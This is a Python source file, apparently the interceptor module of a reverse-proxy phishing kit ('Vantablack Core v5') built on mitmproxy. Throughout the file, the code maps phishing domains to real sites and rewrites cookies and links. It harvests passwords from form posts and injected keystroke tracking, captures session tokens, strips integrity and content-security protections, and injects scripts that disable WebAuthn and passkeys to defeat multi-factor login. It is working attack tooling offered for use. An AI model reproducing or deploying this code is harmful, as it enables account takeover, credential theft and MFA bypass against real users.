"""
Vantablack Core v5 - Edge Interceptor
=====================================

Core mitmproxy addon that handles:
- Request rewriting (Phishing Domain -> Target Domain)
- Response rewriting (Target Domain -> Phishing Domain)
- Credential harvesting
- Session token capture
- Javascript injection
"""

import logging
import re
try:
    from mitmproxy import http, ctx
except Exception:
    class http:  # type: ignore
        class HTTPFlow:  # type: ignore
            pass
    class ctx:  # type: ignore
        pass
from core.edge.phishlets import PhishletConfig, PhishletLoader
from core.edge.session import SessionManager
from core.common import config
from core.common.metrics import RATE_LIMITED, BLOCKED_IP
from plugins.hook_system import trigger_hook, HookType, HookContext
import time

class VantaInterceptor:
    def __init__(self, phishlet: PhishletConfig, session_manager: SessionManager):
        self.phishlet = phishlet
        self.session_manager = session_manager
        self.logger = logging.getLogger("vantablack.edge.interceptor")
        self.logger.info(f"Interceptor loaded for phishlet: {phishlet.name}")
        self.limit_per_min = config.get_int("RATE_LIMIT_PER_MINUTE", 120)
        self.allow_ips = set(config.get_list("ALLOW_IPS"))
        self.deny_ips = set(config.get_list("DENY_IPS"))
        self._buckets = {}  # ip -> [timestamps]

    async def request(self, flow: http.HTTPFlow):
        """
        Handle incoming request:
        1. Identify session (cookie/path)
        2. Map host (phishing -> target)
        3. Strip indicators (referer)
        4. Path rewrites & blocklist
        """
        # Trigger Plugin Hook
        context = HookContext(flow=flow, phishlet=self.phishlet)
        await trigger_hook(HookType.HTTP_REQUEST_INTERCEPT, context)
        if context.action == "block":
            flow.response = http.Response.make(403, b"Blocked by Plugin", {})
            return

        # Session Identification
        session_id = None
        if "vanta_sid" in flow.request.cookies:
            session_id = flow.request.cookies["vanta_sid"]
        else:
            # Create new session if landing
            import uuid
            session_id = str(uuid.uuid4())
            # We'll set the cookie in response
            if not hasattr(flow, "metadata"):
                flow.metadata = {}
            flow.metadata["v_new_session"] = session_id

        # Ensure metadata exists
        if not hasattr(flow, "metadata"):
            flow.metadata = {}
        flow.metadata["v_session_id"] = session_id
        
        # Ensure session exists in manager
        client_ip = "0.0.0.0"
        try:
            client_ip = getattr(flow.client_conn, "address", ("0.0.0.0", 0))[0]
        except Exception:
            pass
        
        # Only create if not exists (or new)
        if flow.metadata.get("v_new_session") or not self.session_manager.get_session(session_id):
             ua = flow.request.headers.get("user-agent", "unknown")
             self.session_manager.create_session(
                 session_id=session_id,
                 campaign_id="manual", # TODO: dynamic campaign ID
                 phishlet_name=self.phishlet.name,
                 ip=client_ip,
                 ua=ua
             )

        host = flow.request.pretty_host
        # ACL
        if (self.allow_ips and client_ip not in self.allow_ips) or (client_ip in self.deny_ips):
            try:
                BLOCKED_IP.labels(ip=client_ip).inc()
                if hasattr(http, "Response"):
                    flow.response = http.Response.make(403, b"Forbidden", {})
                    return
            except Exception:
                return
        # Rate limit
        now = time.time()
        bucket = self._buckets.setdefault(client_ip, [])
        # purge entries older than 60s
        bucket[:] = [t for t in bucket if now - t < 60]
        if len(bucket) >= self.limit_per_min:
            RATE_LIMITED.labels(ip=client_ip).inc()
            if hasattr(http, "Response"):
                flow.response = http.Response.make(429, b"Too Many Requests", {})
                return
        else:
            bucket.append(now)
        
        # Internal Telemetry Endpoint (Behavioral Data)
        if flow.request.path == "/__vanta_track":
            try:
                if flow.request.method == "POST":
                    data = {}
                    if hasattr(flow.request, "multipart_form") and flow.request.multipart_form:
                        try:
                            # Handle MultiDictView safely
                            for key, val in flow.request.multipart_form.items(multi=True):
                                k_str = key.decode() if isinstance(key, bytes) else key
                                v_str = val.decode() if isinstance(val, bytes) else val
                                data[k_str] = v_str
                        except Exception:
                            pass
                    else:
                        # Try form-urlencoded
                        try:
                            if hasattr(flow.request, "urlencoded_form") and flow.request.urlencoded_form:
                                for key, val in flow.request.urlencoded_form.items(multi=True):
                                    k_str = key.decode() if isinstance(key, bytes) else key
                                    v_str = val.decode() if isinstance(val, bytes) else val
                                    data[k_str] = v_str
                        except Exception:
                            pass
                    
                    if data:
                        self.logger.info(f"Captured Behavior: {data}")
                        # Store in session if possible
                        # trigger hook
                        ctx = HookContext(flow=flow, phishlet=self.phishlet)
                        ctx.data = data
                        await trigger_hook(HookType.BEHAVIOR_CAPTURED, ctx)
                        
                        # If keystrokes look like credentials, try to capture them
                        if 'f' in data and 'k' in data:
                            field = data['f']
                            val = data['k']
                            # Very basic heuristic for now
                            if 'pass' in field.lower() or 'email' in field.lower() or 'user' in field.lower():
                                # Capture as credential
                                self.session_manager.capture_credential(
                                    session_id=session_id,
                                    username=val if 'user' in field.lower() or 'email' in field.lower() else "unknown",
                                    password=val if 'pass' in field.lower() else "unknown",
                                    url=flow.request.pretty_url
                                )
                                self.logger.info(f"Keystroke Credential: {field}={val}")

                if hasattr(http, "Response"):
                    resp = http.Response.make(200, b"OK", {"Access-Control-Allow-Origin": "*", "Content-Type": "text/plain"})
                    # Ensure session cookie is set if this was a new session
                    if session_id and flow.metadata.get("v_new_session"):
                        # Use header directly to avoid mitmproxy cookie parsing issues
                        resp.headers["Set-Cookie"] = f"vanta_sid={session_id}; Path=/"
                    flow.response = resp
                return
            except Exception as e:
                import traceback
                self.logger.error(f"Telemetry error: {e}\n{traceback.format_exc()}")
                if hasattr(http, "Response"):
                    flow.response = http.Response.make(500, b"Error", {})
                return

        # TODO: Dynamic mapping based on loaded phishlet
        # For prototype, we assume the first proxy_host maps to target
        target_map = {}
        for m in self.phishlet.proxy_hosts:
             # Support both legacy and new schema
             key = m.phish_sub or m.subdomain
             val = m.target
             if not val and m.orig_sub and m.domain:
                 val = f"{m.orig_sub}.{m.domain}"
             if key and val:
                 target_map[key] = val
        
        # Check if we are hitting a known phishing host
        # (Simplified matching logic for V5 MVP)
        mapped = False
        for phish_sub, target_host in target_map.items():
            if phish_sub in host:
                # Capture original Host before we modify the request
                orig_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
                try:
                    if not hasattr(flow, "metadata"):
                        flow.metadata = {}
                except Exception:
                    pass
                # Apply mapping
                flow.request.host = target_host
                try:
                    xfwd = flow.request.headers.get("x-forwarded-host")
                    xorig = flow.request.headers.get("x-original-host")
                    fwd = flow.request.headers.get("forwarded")
                    import re as _re_ip
                    cand = None
                    if xfwd:
                        cand = xfwd.split(",")[0].strip()
                    elif xorig:
                        cand = xorig.split(",")[0].strip()
                    elif fwd and "host=" in fwd:
                        try:
                            m = re.search(r"host=([^;,\s]+)", fwd, re.IGNORECASE)
                            if m:
                                cand = m.group(1)
                        except Exception:
                            pass
                    if not cand:
                        cand = (orig_hdr or host).split(",")[0].strip()
                    if ":" in cand:
                        cand = cand.split(":", 1)[0]
                    if _re_ip.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
                        ph_effective = host
                    else:
                        ph_effective = cand
                    flow.metadata["v_ph_host"] = ph_effective
                    flow.metadata["v_tgt_host"] = target_host
                    if getattr(self.phishlet, "bridges", []):
                        flow.metadata["v_single_domain"] = True
                except Exception:
                    pass
                self.logger.debug(f"Rewrote host: {host} -> {target_host}")
                mapped = True
                break
        # Fallback mapping: if no subdomain match, route to first target host of phishlet
        if not mapped:
            try:
                first = next(iter(self.phishlet.proxy_hosts))
                first_target = first.target
                if not first_target and first.orig_sub and first.domain:
                    first_target = f"{first.orig_sub}.{first.domain}"
                
                if first_target:
                    # Capture original Host before we modify the request
                    orig_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
                    # Apply mapping
                    flow.request.host = first_target
                    try:
                        flow.request.scheme = "https"
                    except Exception:
                        pass
                    try:
                        flow.request.port = 443
                    except Exception:
                        pass
                    if not hasattr(flow, "metadata"):
                        flow.metadata = {}
                    xfwd = flow.request.headers.get("x-forwarded-host")
                    xorig = flow.request.headers.get("x-original-host")
                    fwd = flow.request.headers.get("forwarded")
                    import re as _re_ip2
                    cand = None
                    if xfwd:
                        cand = xfwd.split(",")[0].strip()
                    elif xorig:
                        cand = xorig.split(",")[0].strip()
                    elif fwd and "host=" in fwd:
                        try:
                            m = re.search(r"host=([^;,\s]+)", fwd, re.IGNORECASE)
                            if m:
                                cand = m.group(1)
                        except Exception:
                            pass
                    if not cand:
                        cand = (orig_hdr or host).split(",")[0].strip()
                    if ":" in cand:
                        cand = cand.split(":", 1)[0]
                    if _re_ip2.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
                        ph_effective = host
                    else:
                        ph_effective = cand
                    flow.metadata["v_ph_host"] = ph_effective
                    flow.metadata["v_tgt_host"] = first_target
                    if getattr(self.phishlet, "bridges", []):
                        flow.metadata["v_single_domain"] = True
                    self.logger.debug(f"Fallback host map: {host} -> {first_target}")
            except Exception:
                pass
        
        # Remove potentially leaking headers
        if "referer" in flow.request.headers:
            del flow.request.headers["referer"]

        # Blocklist resources early
        try:
            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
            for rule in getattr(self.phishlet, "blocklist", []):
                if re.search(rule.pattern, url):
                    self.logger.info(f"Blocking resource by rule: {rule.pattern}")
                    if hasattr(http, "Response"):
                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
                    return
        except Exception:
            pass

        # Path rewrites
        try:
            path = getattr(flow.request, "path", "")
            method = getattr(flow.request, "method", "GET")
            # Bridge rules: route certain prefixes to alternate target hosts (e.g., api.x.com)
            try:
                for br in getattr(self.phishlet, "bridges", []):
                    pfx = br.prefix
                    if pfx and path.startswith(pfx):
                        new_path = path[len(pfx):] if br.strip_prefix else path
                        if not new_path.startswith("/"):
                            new_path = "/" + new_path
                        flow.request.path = new_path
                        flow.request.host = br.target_host
                        try:
                            flow.request.scheme = "https"
                        except Exception:
                            pass
                        try:
                            flow.request.port = 443
                        except Exception:
                            pass
                        try:
                            oh = br.origin_host or br.target_host
                            flow.request.headers["origin"] = f"https://{oh}"
                            flow.request.headers["referer"] = f"https://{oh}{new_path}"
                        except Exception:
                            pass
                        try:
                            if not hasattr(flow, "metadata"):
                                flow.metadata = {}
                            flow.metadata["v_tgt_host"] = br.target_host
                            flow.metadata["v_bridge"] = True
                            flow.metadata["v_bridge_pfx"] = br.prefix
                            flow.metadata["v_bridge_cors"] = br.cors or ""
                            flow.metadata["v_bridge_origin"] = (br.origin_host or br.target_host)
                        except Exception:
                            pass
                        break
            except Exception:
                pass
            for rule in getattr(self.phishlet, "path_rewrites", []):
                if method in rule.methods and re.search(rule.pattern, path):
                    new_path = re.sub(rule.pattern, rule.replace, path)
                    self.logger.debug(f"Rewrote path: {path} -> {new_path}")
                    flow.request.path = new_path
        except Exception:
            pass

        # Capture Credentials (POST)
        if flow.request.method == "POST":
            self._scan_for_credentials(flow)

    def response(self, flow: http.HTTPFlow):
        """
        Handle outgoing response:
        1. Map host (target -> phishing) in Location/Cookies
        2. Inject JS hooks
        3. Capture session tokens
        4. Header & Cookie rewrite rules
        """
        # 0. Set Session Cookie if new
        try:
            new_sid = getattr(flow, "metadata", {}).get("v_new_session")
            if new_sid:
                flow.response.headers.add("Set-Cookie", f"vanta_sid={new_sid}; Path=/")
                # Avoid accessing flow.response.cookies directly if it causes issues
        except Exception:
            pass

        # 1. Rewrite Location headers
        if "Location" in flow.response.headers:
            try:
                loc = flow.response.headers["Location"]
                ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
                tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
                if ph_host and loc:
                    from urllib.parse import urlsplit, urlunsplit
                    sp = urlsplit(loc)
                    new_netloc = sp.netloc
                    targets = [m.target for m in getattr(self.phishlet, "proxy_hosts", [])]
                    if sp.netloc in targets or (tgt_host and sp.netloc == tgt_host):
                        new_netloc = ph_host
                    new_loc = urlunsplit((sp.scheme, new_netloc, sp.path, sp.query, sp.fragment))
                    flow.response.headers["Location"] = new_loc
            except Exception:
                pass

        # 2. Capture Set-Cookie
        self._scan_for_tokens(flow)

        # 2b. Apply cookie rewrite rules
        try:
            for rule in getattr(self.phishlet, "cookie_rewrites", []):
                if rule.name in flow.response.cookies:
                    value, attrs = flow.response.cookies[rule.name]
                    if rule.domain_to:
                        attrs["domain"] = rule.domain_to
                    if rule.path_to:
                        attrs["path"] = rule.path_to
                    if rule.samesite:
                        attrs["samesite"] = rule.samesite
                    if rule.secure is not None:
                        attrs["secure"] = rule.secure
                    flow.response.cookies[rule.name] = (value, attrs)
        except Exception:
            pass
        # 2b bis. Auto-rewrite cookie domain target -> phishing host (fallback)
        try:
            ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
            tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
            is_bridge = getattr(flow, "metadata", {}).get("v_bridge", False)
            single_domain = getattr(flow, "metadata", {}).get("v_single_domain", False)

            if ph_host:
                for name, (value, attrs) in list(flow.response.cookies.items()):
                    dom = attrs.get("domain")
                    if single_domain or is_bridge:
                        if "domain" in attrs:
                            del attrs["domain"]
                        if "samesite" in attrs and attrs["samesite"].lower() == "none":
                            attrs["secure"] = True # Must be secure for None
                        flow.response.cookies[name] = (value, attrs)
                    elif tgt_host and dom and (dom == tgt_host or dom.endswith("." + tgt_host)):
                        attrs["domain"] = ph_host
                        flow.response.cookies[name] = (value, attrs)
        except Exception:
            pass

        # 2c. Header rules
        try:
            for hr in getattr(self.phishlet, "headers", []):
                name = hr.name
                action = hr.action.lower()
                if action == "remove":
                    if name in flow.response.headers:
                        del flow.response.headers[name]
                elif action == "set" and hr.value is not None:
                    flow.response.headers[name] = hr.value
        except Exception:
            pass
        # 2d. Blocklist by mime/size
        try:
            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
            ctype = flow.response.headers.get("content-type", "")
            clen = 0
            try:
                clen = int(flow.response.headers.get("content-length", "0"))
            except Exception:
                clen = len(flow.response.content or b"")
            for rule in getattr(self.phishlet, "blocklist", []):
                try:
                    if rule.pattern and url and not re.search(rule.pattern, url):
                        continue
                except Exception:
                    pass
                if rule.mimes and not any(m in ctype for m in rule.mimes):
                    continue
                if rule.max_kb is not None and clen > rule.max_kb * 1024:
                    if hasattr(http, "Response"):
                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
                        return
        except Exception:
            pass

        # 2e. Apply sub_filters (Mirroring)
        self._apply_sub_filters(flow)

        # 3. Inject Content
        if flow.response.content:
            self._inject_scripts(flow)
        # 3b. CORS fallback patch
        try:
            req_origin = flow.request.headers.get("origin")
            if req_origin:
                mode = getattr(flow, "metadata", {}).get("v_bridge_cors", "")
                if mode == "allow_all":
                    # Force overwrite CORS for bridges
                    flow.response.headers["access-control-allow-origin"] = req_origin
                    flow.response.headers["access-control-allow-credentials"] = "true"
                    # Remove conflicting wildcard if present
                    if flow.response.headers.get("access-control-allow-origin") == "*":
                         flow.response.headers["access-control-allow-origin"] = req_origin

                elif "access-control-allow-origin" not in flow.response.headers:
                    # Default fallback only if missing
                    flow.response.headers["access-control-allow-origin"] = req_origin
                    flow.response.headers["access-control-allow-credentials"] = "true"
                
                if "access-control-allow-headers" not in flow.response.headers:
                    flow.response.headers["access-control-allow-headers"] = "Authorization,Content-Type,Accept,Origin,Referer,User-Agent,X-Requested-With,x-twitter-active-user,x-twitter-client-language,x-csrf-token,x-guest-token"
                if "access-control-allow-methods" not in flow.response.headers:
                    flow.response.headers["access-control-allow-methods"] = "GET,POST,OPTIONS,PUT,DELETE,HEAD,PATCH"
        except Exception:
            pass

    def _scan_for_credentials(self, flow: http.HTTPFlow):
        """Analyze POST body for defined credential fields"""
        try:
            session_id = getattr(flow, "metadata", {}).get("v_session_id")
            if not session_id: return

            content = flow.request.get_text(strict=False) if hasattr(flow.request, "get_text") else flow.request.text
            
            # Helper to extract value
            def extract(regex, text):
                m = re.search(regex, text)
                return m.group(1) if m else None

            username = None
            password = None
            
            for key, rule in self.phishlet.credentials.items():
                if rule.type == "post_param" or rule.type == "post":
                    # Regex for post param: key=value
                    # Construct regex: (?:^|&)name=([^&]*)
                    param_regex = rf"(?:^|&){re.escape(rule.key)}=([^&]*)"
                    val = extract(param_regex, content)
                    
                    if val:
                        import urllib.parse
                        val = urllib.parse.unquote_plus(val)
                        self.logger.info(f"Captured {key}: {val}")
                        
                        if key == "username" or key == "email":
                            username = val
                        elif key == "password":
                            password = val

            if username or password:
                self.session_manager.capture_credential(
                    session_id=session_id,
                    username=username or "unknown",
                    password=password or "unknown",
                    url=flow.request.pretty_url
                )
        except Exception as e:
            self.logger.error(f"Error scanning credentials: {e}")

    def _scan_for_tokens(self, flow: http.HTTPFlow):
        """Analyze Set-Cookie headers for session tokens"""
        try:
            session_id = getattr(flow, "metadata", {}).get("v_session_id")
            if not session_id: return

            cookies = flow.response.cookies
            for name, (value, attrs) in cookies.items():
                # Check against phishlet auth_tokens rules
                for rule in self.phishlet.auth_tokens:
                    # rule is AuthToken or Dict (Pydantic model or dict)
                    r_keys = getattr(rule, "keys", [])
                    if isinstance(rule, dict):
                         r_keys = rule.get("keys", [])

                    # If rule has keys list, check if name is in keys
                    if name in r_keys:
                        self.session_manager.capture_token(session_id, name, value)
                        
        except Exception as e:
            self.logger.error(f"Error scanning tokens: {e}")

    def _apply_sub_filters(self, flow: http.HTTPFlow):
        """Apply string replacements on response body based on sub_filters"""
        try:
            if not flow.response.content: return
            
            content_type = flow.response.headers.get("content-type", "")
            ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
            
            # Determine base domain (e.g., example.com) from ph_host (e.g., sub.example.com)
            # This is tricky without tldextract, so we rely on heuristic:
            # Assume 2 levels TLD (co.uk) or 1 level (com).
            # For now, we assume standard 1 level or just split by dot.
            # BUT, we can use the phishlet config if available, or just split.
            # A better way: The phishlet loader knows the base domain.
            # But we don't have access to it here easily.
            # Let's try to extract it from the request host if possible.
            if not ph_host: return

            base_domain = ph_host

            for f in getattr(self.phishlet, "sub_filters", []):
                # Check mime
                mime_match = False
                for m in f.mimes:
                    if m in content_type:
                        mime_match = True
                        break
                if not mime_match: continue
                
                # Check triggers_on (target hostname)
                # We should apply if the current response is from the target host
                # OR if we just want to replace occurrences globally in any response.
                # For single-domain mirroring (localhost.run), we MUST apply globally
                # because scripts on abs.twimg.com contain links to api.x.com that need rewriting.
                # So we DISABLE the strict triggers_on check for now.
                tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
                # if tgt_host and f.triggers_on not in tgt_host:
                #      pass 

                # Prepare replacement
                target_hostname = f"{f.orig_sub}.{f.domain}"
                if not f.orig_sub and f.domain: # Handle empty subdomain
                     target_hostname = f.domain
                
                phish_hostname = None
                
                # DEBUG LOG
                self.logger.info(f"SubFilter Debug: {target_hostname} | Base: {base_domain} | Replace: {f.replace}")

                # 1. Check Bridge (Priority for Single Domain / Path-based routing)
                bridge_prefix = None
                for br in getattr(self.phishlet, "bridges", []):
                    if br.target_host == target_hostname:
                        pfx = br.prefix
                        if not pfx.startswith("/"): pfx = "/" + pfx
                        if pfx.endswith("/"): pfx = pfx[:-1]
                        phish_hostname = f"{base_domain}{pfx}"
                        bridge_prefix = pfx
                        break
                
                # 2. Check ProxyHost (Subdomain mapping)
                if not phish_hostname:
                    for ph in self.phishlet.proxy_hosts:
                        if ph.orig_sub == f.orig_sub and ph.domain == f.domain:
                            # Special handling for Landing Host in Single-Domain Mode (Bridges present)
                            # If bridges are defined, we assume we are running on a single domain (like localhost.run)
                            # In this case, the Landing ProxyHost (x.com) should map to the ROOT of the phishing domain (ph_host),
                            # NOT to a subdomain (x.ph_host).
                            has_bridges = len(getattr(self.phishlet, "bridges", [])) > 0
                            if has_bridges and ph.is_landing:
                                phish_hostname = ph_host # Use the current request host as the replacement
                            else:
                                phish_hostname = f"{ph.phish_sub}.{base_domain}"
                            break
                
                if not phish_hostname: continue
                
                search_str = f.search.replace("{hostname}", target_hostname).replace("{domain}", f.domain)
                replace_str = f.replace.replace("{hostname}", phish_hostname).replace("{domain}", base_domain)
                # If landing host and bridges are enabled, prefer root-relative path to keep same-origin
                try:
                    has_bridges = len(getattr(self.phishlet, "bridges", [])) > 0
                    is_landing = any((ph.orig_sub == f.orig_sub and ph.domain == f.domain and getattr(ph, "is_landing", False)) for ph in getattr(self.phishlet, "proxy_hosts", []))
                    if has_bridges and is_landing:
                        replace_str = "/"
                except Exception:
                    pass
                # If bridged, prefer path-only replacement to avoid absolute host leakage (e.g., 127.0.0.1)
                if bridge_prefix:
                    replace_str = bridge_prefix
                
                # Apply
                try:
                    # Use regex if search_str looks like regex?
                    # Evilginx uses string replacement usually.
                    # But Python's replace is literal.
                    # Let's try literal first.
                    applied = False
                    if search_str in flow.response.text:
                        flow.response.text = flow.response.text.replace(search_str, replace_str)
                        applied = True
                    # Also handle trailing slash variant
                    s2 = search_str + "/"
                    r2 = replace_str + "/" if not replace_str.endswith("/") else replace_str
                    if s2 in flow.response.text:
                        flow.response.text = flow.response.text.replace(s2, r2)
                        applied = True
                    if applied:
                        self.logger.debug(f"Applied filter: {search_str}[/*] -> {replace_str}[/*]")
                except Exception:
                    pass
                    
        except Exception as e:
            self.logger.error(f"Error applying sub_filters: {e}")

    def _inject_scripts(self, flow: http.HTTPFlow):
        if "text/html" in flow.response.headers.get("content-type", ""):
            # 0. Remove SRI integrity attributes to allow modified scripts to run
            try:
                flow.response.text = re.sub(r' integrity="[^"]*"', '', flow.response.text)
                flow.response.text = re.sub(r" integrity='[^']*'", '', flow.response.text)
                # Remove CSP meta tags
                flow.response.text = re.sub(r'<meta http-equiv="Content-Security-Policy"[^>]*>', '', flow.response.text, flags=re.IGNORECASE)
                flow.response.text = re.sub(r'<meta http-equiv="X-Frame-Options"[^>]*>', '', flow.response.text, flags=re.IGNORECASE)
            except Exception:
                pass

            # HTML static URL rewrite for bridges (script/link/img absolute URLs)
            try:
                import re as _re
                for b in getattr(self.phishlet, "bridges", []):
                    host = _re.escape(b.target_host)
                    pfx = b.prefix
                    if not pfx.endswith("/"):
                        pfx = pfx + "/"
                    # Protocol-absolute and https absolute
                    flow.response.text = _re.sub(r'((?:src|href)=["\'])https?://'+host+r'/', r'\1'+pfx, flow.response.text)
                    flow.response.text = _re.sub(r'((?:src|href)=["\'])//'+host+r'/', r'\1'+pfx, flow.response.text)
            except Exception:
                pass
            # Dynamic bridge injection: reroute fetch/XHR for specified host(s) to local prefixes
            try:
                bridges = getattr(self.phishlet, "bridges", [])
                if bridges:
                    parts = []
                    for b in bridges:
                        host = b.target_host.replace("'", "\\'")
                        pfx = b.prefix.replace("'", "\\'")
                        parts.append(f"{{h:'{host}',p:'{pfx}'}}")
                    arr = "[" + ",".join(parts) + "]"
                    js_bridge = (
                        "(function(){try{"
                        f"var BR={arr};"
                        "function rw(u){try{var x=new URL(u,window.location.origin);"
                        "for(var i=0;i<BR.length;i++){var b=BR[i];if(x.host===b.h){return b.p+x.pathname.replace(/^\\//,'')+(x.search||'');}}}catch(e){}return u;}"
                        "var of=window.fetch;if(of){window.fetch=function(i,n){try{if(typeof i==='string'){i=rw(i);}else if(i&&i.url){var r=rw(i.url);if(r!==i.url)i=new Request(r,i);}}catch(e){}return of.call(this,i,n);};}"
                        "var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{u=rw(u);}catch(e){}return xo.apply(this,[m,u].concat([].slice.call(arguments,2)));};"
                        "if(navigator.credentials){try{"
                        "if(navigator.credentials.get){navigator.credentials.get=function(){return Promise.reject(new DOMException('Not supported','NotSupportedError'));};}"
                        "if(navigator.credentials.create){navigator.credentials.create=function(){return Promise.reject(new DOMException('Not supported','NotSupportedError'));};}"
                        "}catch(e){}}"
                        "if(window.PublicKeyCredential&&window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable){"
                        "try{var _old=window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable;"
                        "window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){try{return Promise.resolve(false);}catch(e){return _old.call(this);}};"
                        "}catch(e){}}"
                        "}catch(e){}})();"
                    )
                    if "</body>" in flow.response.text:
                        flow.response.text = flow.response.text.replace(
                            "</body>",
                            f"<script>{js_bridge}</script></body>"
                        )
                    else:
                        flow.response.text = (flow.response.text or "") + f"<script>{js_bridge}</script>"
            except Exception:
                pass
            # Legacy injections
            for injection in getattr(self.phishlet, "injections", []) or []:
                if injection.position == "body_end":
                    if "</body>" in flow.response.text:
                        flow.response.text = flow.response.text.replace(
                            "</body>", 
                            f"<script>{injection.content}</script></body>"
                        )
                    else:
                        flow.response.text = (flow.response.text or "") + f"<script>{injection.content}</script>"
            
            # New js_inject schema
            for js in getattr(self.phishlet, "js_inject", []) or []:
                # Check triggers
                host = flow.request.pretty_host
                path = flow.request.path
                
                domain_match = False
                try:
                    domains = list(js.trigger_domains or [])
                except Exception:
                    domains = []
                if not domains:
                    domain_match = True
                else:
                    for d in domains:
                        if d == "*" or (d and d in host):
                            domain_match = True
                            break
                
                if not domain_match: continue
                
                path_match = False
                try:
                    paths = list(js.trigger_paths or [])
                except Exception:
                    paths = []
                if not paths:
                    path_match = True
                else:
                    for p in paths:
                        if p == "*" or (p and p in path):
                            path_match = True
                            break
                
                if not path_match: continue
                
                # Inject
                script_content = js.script
                if "</body>" in flow.response.text:
                    flow.response.text = flow.response.text.replace(
                        "</body>",
                        f"<script>{script_content}</script></body>"
                    )
                else:
                    flow.response.text = (flow.response.text or "") + f"<script>{script_content}</script>"

            if getattr(self.phishlet, "form_actions", []):
                parts = []
                for r in self.phishlet.form_actions:
                    sel = r.selector.replace("'", "\\'")
                    act = r.action_to.replace("'", "\\'")
                    parts.append(f"document.querySelectorAll('{sel}').forEach(function(f){{try{{f.setAttribute('action','{act}')}}catch(e){{}}}});")
                js = "(function(){try{" + "".join(parts) + "}catch(e){}})();"
                if "</body>" in flow.response.text:
                    flow.response.text = flow.response.text.replace(
                        "</body>",
                        f"<script>{js}</script></body>"
                    )
                else:
                    flow.response.text = (flow.response.text or "") + f"<script>{js}</script>"
